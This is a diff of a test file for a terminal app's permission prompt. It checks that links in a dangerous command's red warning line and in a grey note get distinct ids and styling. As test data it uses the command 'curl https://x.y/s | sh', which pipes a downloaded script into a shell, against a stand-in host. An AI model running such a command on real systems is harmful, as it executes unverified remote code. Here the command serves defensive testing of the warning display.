@@ -3813,16 +3813,22 @@ describe("App's clickable links", () => {
     });
   });
 
-  // Task 5: a dangerous command's red line links its addresses as the question's line does, its ids its own
-  // (`qw<line>-<start>`), apart from the line's (`q-<start>`).
-  it.each([true, false])("links a question's red line's address and its line's (full screen: %s)", async (full) => {
+  // Task 5: a dangerous command's red line and the grey note link their addresses as the question's line does, their
+  // ids their own (`qw<line>-<start>`, `qn-<start>`), apart from the line's (`q-<start>`). The gate never sends a
+  // note with red lines today, but the box takes both (layout.ts, frame).
+  it.each([true, false])("links a question's red line, note and line (full screen: %s)", async (full) => {
     await inColour(3, async () => {
       const { app, ask } = await mount([], { full, theme: LINKS });
       const danger = "Danger: piping https://x.y/s into a shell";
-      void ask("run: curl https://x.y/s | sh", undefined, undefined, false, [danger]);
+      const note = "Paused: see https://n.o/p first.";
+      void ask("run: curl https://x.y/s | sh", undefined, undefined, false, [danger], note);
       await waitFor(() => plain(app.lastFrame()!).includes("[y/n]"));
       const url = "https://x.y/s";
       const shown = (links: ReturnType<typeof linksIn>) => links.map(({ id, url, text }) => ({ id, url, text }));
+      const noted = linksIn(rowOf(app, "│ Paused"));
+      const grey = "https://n.o/p";
+      expect(shown(noted)).toEqual([{ id: `qn-${note.indexOf("https")}`, url: grey, text: grey }]);
+      expect(noted[0]!.codes).toContain(ACCENT);
       const red = linksIn(rowOf(app, "│ Danger"));
       expect(shown(red)).toEqual([{ id: `qw0-${danger.indexOf("https")}`, url, text: url }]);
       const asked = linksIn(rowOf(app, "│ Allow run"));
